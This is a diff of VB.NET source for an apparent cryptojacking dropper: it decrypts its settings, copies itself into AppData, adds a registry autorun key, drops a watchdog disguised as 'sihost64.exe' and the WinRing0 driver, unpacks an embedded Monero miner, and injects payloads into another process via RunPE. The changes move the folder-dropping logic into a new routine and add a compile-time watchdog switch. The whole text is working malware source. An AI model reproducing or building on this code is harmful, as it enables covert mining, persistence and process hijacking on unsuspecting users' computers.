@@ -21,6 +21,7 @@ Imports System.Text
 
 #Const Assembly = False
 #Const INS = False
+#Const WD = False
 #Const EnableGPU = False
 
 #If Assembly Then
@@ -35,8 +36,12 @@ Imports System.Text
 #End If
 
 Public Class Program
+    Public Shared lb As String = GetString("#LIBSPATH")
+    Public Shared bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb
+
     Public Shared Sub Main()
 #If INS Then
+        Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
         Install()
 #End If
         Initialize()
@@ -54,13 +59,9 @@ Public Class Program
                         End If
                     Catch : End Try
                 Next
-                Using Drop As New System.IO.FileStream(PayloadPath, FileMode.Create)
-                    Dim Client As Byte() = System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
-                    Drop.Write(Client, 0, Client.Length)
-                End Using
+                System.IO.File.WriteAllBytes(PayloadPath, System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName))
                 Thread.Sleep(2 * 1000)
-                Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
-                Process.Start(PayloadPath)
+                BaseFolder()
                 Environment.Exit(0)
             End If
         Catch ex As Exception
@@ -78,10 +79,35 @@ Public Class Program
         Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
     End Function
 
+
     Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
         'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
         Try
             Assembly.Load(PL).GetType(GetString("#DLLSTR")).GetMethod(GetString("#DLLOAD"), BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Public Shared Sub BaseFolder()
+        Try
+            System.IO.Directory.CreateDirectory(bD)
+            Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
+
+#If WD Then
+                    For Each proc As Process In Process.GetProcessesByName("sihost64")
+                        proc.Kill()
+                    Next
+
+                    Threading.Thread.Sleep(3000)
+
+                    System.IO.File.WriteAllBytes(bD & "sihost64.exe", GetTheResource("#watchdog"))
+
+                    If Process.GetProcessesByName("sihost64").Length < 1 Then
+                        Process.Start(bD & "sihost64.exe")
+                    End If
+#End If
+
+            System.IO.File.WriteAllBytes(bD & "WR64.sys", GetTheResource("#winring"))
         Catch ex As Exception
         End Try
     End Sub
@@ -115,35 +141,11 @@ Public Class Program
         Try
             Dim x As Byte() = GetTheResource("#xmr")
             Dim xm As Byte() = New Byte() {}
-            Dim wr As Byte() = GetTheResource("#winring")
-            Dim lb As String = GetString("#LIBSPATH")
-            Dim bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb
             Dim rS As String = ""
 
+            BaseFolder()
+
             Try
-                Try
-                    System.IO.Directory.CreateDirectory(bD)
-                    Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
-
-
-#If INS Then
-                    For Each proc As Process In Process.GetProcessesByName("sihost64")
-                        proc.Kill()
-                    Next
-
-                    Threading.Thread.Sleep(3000)
-
-                    System.IO.File.WriteAllBytes(bD & "sihost64.exe", GetTheResource("#watchdog"))
-
-                    If Process.GetProcessesByName("sihost64").Length < 1 Then
-                        Process.Start(bD & "sihost64.exe")
-                    End If
-#End If
-
-                    System.IO.File.WriteAllBytes(bD & "WR64.sys", wr)
-                Catch ex As Exception
-                End Try
-
                 Try
                     Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
                         For Each entry As ZipArchiveEntry In archive.Entries
